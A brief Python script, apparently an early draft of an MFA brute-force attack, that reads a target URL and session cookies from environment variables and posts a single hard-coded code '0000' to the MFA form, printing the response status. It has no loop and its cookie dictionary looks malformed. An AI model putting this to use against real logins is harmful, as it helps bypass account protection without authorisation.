from dotenv import load_dotenv
import os
import requests

load_dotenv()
url = os.getenv('URL')
session = os.getenv('SESSION')
user = os.getenv('USER')
mfa_payload = '0000'

cookies = {
        session: session,
        user: user
    }
brute_force = requests.post(url,
                            cookies = cookies,
                            data = {'mfa-code': mfa_payload})
print(brute_force.status_code)